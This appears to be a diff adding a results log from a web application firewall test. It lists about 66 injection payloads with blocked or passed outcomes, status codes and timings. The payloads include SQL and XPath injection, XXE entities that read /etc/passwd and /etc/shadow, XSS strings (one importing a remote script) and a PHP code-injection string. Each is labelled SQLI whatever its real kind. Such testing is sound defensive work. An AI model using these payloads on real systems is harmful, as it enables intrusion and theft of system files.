@@ -1,0 +1,66 @@
+{"payload": "-", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01994033099617809}
+{"payload": "' or ''='", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005476054997416213}
+{"payload": "' or '1'='1", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005708629993023351}
+{"payload": "\"<?xml version=\"\"1.0\"\" encoding=\"\"ISO-8859-1\"\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"\"file:////dev/random\"\">]><foo>&xxe;</foo>\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00605353299761191}
+{"payload": "\"<?xml version=\"\"1.0\"\" encoding=\"\"ISO-8859-1\"\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"\"file:////etc/passwd\"\">]><foo>&xxe;</foo>\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0066408600032445975}
+{"payload": "\"<?xml version=\"\"1.0\"\" encoding=\"\"ISO-8859-1\"\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"\"file:////etc/shadow\"\">]><foo>&xxe;</foo>\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006551338003191631}
+{"payload": "\"<?xml version=\"\"1.0\"\" encoding=\"\"ISO-8859-1\"\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"\"file://c:/boot.ini\"\">]><foo>&xxe;</foo>\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006438290001824498}
+{"payload": "\"<?xml version=\"\"1.0\"\" encoding=\"\"ISO-8859-1\"\"?><foo><![CDATA[' or 1=1 or ''=']]></foo>\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004696174000855535}
+{"payload": "\"<?xml version=\"\"1.0\"\" encoding=\"\"ISO-8859-1\"\"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00611044600373134}
+{"payload": "\"<HTML xmlns:xss><?import namespace=\"\"xss\"\" implementation=\"\"http://xss.rocks/xss.htc\"\"><xss:xss>XSS</xss:xss></HTML>\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005716161002055742}
+{"payload": "\"<HTML xmlns:xss><?import namespace=\"\"xss\"\" implementation=\"\"http://xss.rocks/xss.htc\"\"><xss:xss>XSS</xss:xss></HTML>\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005256298005406279}
+{"payload": "\"<xml ID=\"\"xss\"\"><I><B><IMG SRC=\"\"javas<!-- -->cript:alert('XSS')\"\"></B></I></xml><SPAN DATASRC=\"\"#xss\"\" DATAFLD=\"\"B\"\" DATAFORMATAS=\"\"HTML\"\"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0051907779998146}
+{"payload": "\"<xml ID=I><X><C><![CDATA[<IMG SRC=\"\"javas]]><![CDATA[cript:alert('XSS');\"\">]]>\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007317545998375863}
+{"payload": "\"<xml SRC=\"\"xsstest.xml\"\" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004797164001502097}
+{"payload": "$", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015154761997109745}
+{"payload": "%", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01287749300536234}
+{"payload": "&apos;XoiZR", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013499806002073456}
+{"payload": "&lt;% Tnn96 %&gt;", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015238552005030215}
+{"payload": "&lt;%= Tnn96 %&gt;", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.016284489996905904}
+{"payload": "&lt;? Tnn96 ?&gt;", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012408814000082202}
+{"payload": "&lt;?Tnn96 ?&gt;", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012798871997802053}
+{"payload": "&lt;Tnn96&gt;", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012245860998518765}
+{"payload": "&quot;XoiZR", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.0158626100019319}
+{"payload": "(Tnn96)", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015593411997542717}
+{"payload": "*", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015236498999001924}
+{"payload": "*/*", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01405025299754925}
+{"payload": "/", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014464718005910981}
+{"payload": "//", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01769704799517058}
+{"payload": "//*", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014727903995662928}
+{"payload": ":", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015413547997013666}
+{"payload": ";", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014646646995970514}
+{"payload": "@", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015725787001429126}
+{"payload": "@*", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01703106200147886}
+{"payload": "[Tnn96]", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.019056176002777647}
+{"payload": "]>", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01346072200249182}
+{"payload": "{{= Tnn96}}", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015503581998927984}
+{"payload": "{{Tnn96}}", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01653449899458792}
+{"payload": "{= Tnn96}", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.016011965002689976}
+{"payload": "{Tnn96}", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01814602000376908}
+{"payload": "+", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015899527999863494}
+{"payload": "<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004825629999686498}
+{"payload": "<![CDATA[<script>var n=0;while(true){n++;}</script>]]>", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005129720993863884}
+{"payload": "<!DOCTYPE autofillupload [<!ENTITY 9eTVC SYSTEM \"file:///etc/passwd\">", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005935394998232368}
+{"payload": "<!DOCTYPE autofillupload [<!ENTITY D71Mn SYSTEM \"file:///c:/boot.ini\">", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004700096003944054}
+{"payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///dev/random\">]><foo>&xee;</foo>", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005136553001648281}
+{"payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xee;</foo>", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005437370993604418}
+{"payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xee;</foo>", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004809054000361357}
+{"payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file://c:/boot.ini\">]><foo>&xee;</foo>", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037697699954151176}
+{"payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><foo><![CDATA[' or 1=1 or ''=']]></foof>", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036428699968382716}
+{"payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004517784997005947}
+{"payload": "<name>','')); phpinfo(); exit;/*</name>", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004132006004510913}
+{"payload": "0", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015588488997309469}
+{"payload": "0.00005", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.017383291997248307}
+{"payload": "0.1", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.017005652000079863}
+{"payload": "0.9", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01567374799924437}
+{"payload": "1", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014671804994577542}
+{"payload": "-1", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015015194003353827}
+{"payload": "1.7976931348623157e+308", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01639329799945699}
+{"payload": "5e-10", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01733037600206444}
+{"payload": "5e-324", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01454354800080182}
+{"payload": "count(/child::node())", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014152069998090155}
+{"payload": "false", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014936893996491563}
+{"payload": "null", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01473628899839241}
+{"payload": "true", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014139913997496478}
+{"payload": "x' or 1=1 or 'x'='y", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006079953003791161}
+{"payload": "x' or name()='username' or 'x'='y", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015145277997362427}
